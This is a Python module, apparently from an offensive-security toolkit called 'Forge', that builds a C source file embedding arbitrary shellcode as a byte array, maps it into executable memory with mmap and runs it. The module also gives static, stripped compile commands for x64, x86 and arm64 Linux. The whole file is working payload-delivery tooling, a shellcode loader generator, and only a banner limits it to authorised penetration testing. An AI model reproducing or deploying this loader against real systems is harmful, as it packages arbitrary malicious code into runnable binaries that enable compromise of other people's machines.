"""ELF Format Builder — Linux/macOS executable loader.

Wraps shellcode in a C source file that compiles to a Linux ELF binary
using mmap(PROT_EXEC) to execute the payload in-memory.

Compile commands:
  x64:   gcc -o payload     loader.c -static -s -O2
  x86:   gcc -o payload32   loader.c -static -s -O2 -m32
  arm64: aarch64-linux-gnu-gcc -o payload_arm64 loader.c -static -s -O2

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import textwrap


class ElfFormat:
    """Linux ELF format builder."""

    _COMPILE_CMDS = {
        "x64":   "gcc -o payload loader.c -static -s -O2",
        "x86":   "gcc -o payload32 loader.c -static -s -O2 -m32",
        "arm64": "aarch64-linux-gnu-gcc -o payload_arm64 loader.c -static -s -O2",
    }

    def __init__(self, arch: str = "x64"):
        if arch not in self._COMPILE_CMDS:
            raise ValueError(f"ELF format supports {list(self._COMPILE_CMDS)}, got {arch!r}")
        self.arch = arch

    def build(self, shellcode: bytes) -> bytes:
        if self._is_c_source(shellcode):
            header = f"/* Forge ELF Loader ({self.arch}) */\n"
            return (header + shellcode.decode(errors="replace")).encode()
        return self._binary_loader(shellcode).encode()

    def _is_c_source(self, data: bytes) -> bool:
        try:
            head = data[:128].decode("utf-8", errors="strict").lstrip()
            return head.startswith("/*") or head.startswith("#")
        except UnicodeDecodeError:
            return False

    def _binary_loader(self, sc: bytes) -> str:
        sc_hex  = ", ".join(f"0x{b:02x}" for b in sc)
        sz      = len(sc)
        compile_cmd = self._COMPILE_CMDS[self.arch]
        m32 = " -m32" if self.arch == "x86" else ""

        return textwrap.dedent(f"""\
        /*
         * Forge ELF Loader ({self.arch}) — mmap shellcode runner
         * Compile: {compile_cmd}
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #include <sys/mman.h>
        #include <string.h>
        #include <stdlib.h>
        #include <unistd.h>

        static const unsigned char _sc[] = {{ {sc_hex} }};
        #define SC_SIZE {sz}

        int main(void) {{
            void *exec = mmap(NULL, SC_SIZE,
                              PROT_READ | PROT_WRITE | PROT_EXEC,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (exec == (void *)-1) return 1;

            memcpy(exec, _sc, SC_SIZE);

            /* Flush instruction cache (important on ARM64) */
        #if defined(__aarch64__)
            __builtin___clear_cache(exec, (char *)exec + SC_SIZE);
        #endif

            ((void (*)(void))exec)();
            munmap(exec, SC_SIZE);
            return 0;
        }}
        """)
